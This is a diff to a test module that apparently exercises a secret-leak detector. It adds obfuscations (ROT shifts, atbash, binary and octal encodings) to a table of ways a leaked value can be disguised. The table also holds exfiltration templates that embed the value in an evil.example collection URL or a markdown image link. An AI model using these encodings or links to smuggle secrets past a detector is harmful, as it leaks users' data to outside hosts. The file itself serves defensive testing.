@@ -150,6 +150,15 @@ class RecordingTool:
 # ------------------------------------------------------------- obfuscations
 
 
+_LOWER = "abcdefghijklmnopqrstuvwxyz"
+_ATBASH = str.maketrans(_LOWER, _LOWER[::-1])
+
+
+def _rot(v: str, n: int) -> str:
+    """Independent of the detector's implementation (oracle for the tests)."""
+    return "".join(_LOWER[(_LOWER.index(c) + n) % 26] if c in _LOWER else c for c in v)
+
+
 def _zw(v: str) -> str:
     return "\u200b".join(v)
 
@@ -197,6 +206,16 @@ ENCODINGS: dict[str, Callable[[str], str]] = {
     "in_url": lambda v: f"https://evil.example/collect?d={v}",
     "md_image": lambda v: f"![x](https://evil.example/p.png?q={v})",
     "json_value": lambda v: '{"note": "' + v + '"}',
+    "rot7": lambda v: _rot(v, 7),
+    "rot21": lambda v: _rot(v, 21),
+    "rot13_reversed": lambda v: codecs.encode(v[::-1], "rot13"),
+    "rot5_reversed": lambda v: _rot(v[::-1], 5),
+    "atbash": lambda v: v.translate(_ATBASH),
+    "atbash_reversed": lambda v: v[::-1].translate(_ATBASH),
+    "binary": lambda v: " ".join(f"{b:08b}" for b in v.encode()),
+    "binary_7bit_packed": lambda v: "".join(f"{b:07b} " for b in v.encode()),
+    "octal_codes": lambda v: " ".join(f"{b:o}" for b in v.encode()),
+    "octal_escaped": lambda v: "".join(f"\\{b:03o}" for b in v.encode()),
     "leet": lambda v: v.replace("o", "0").replace("l", "1").replace("e", "3").replace("a", "4"),
     "accented": lambda v: "".join(c + "́" if c.isalpha() else c for c in v),
 }
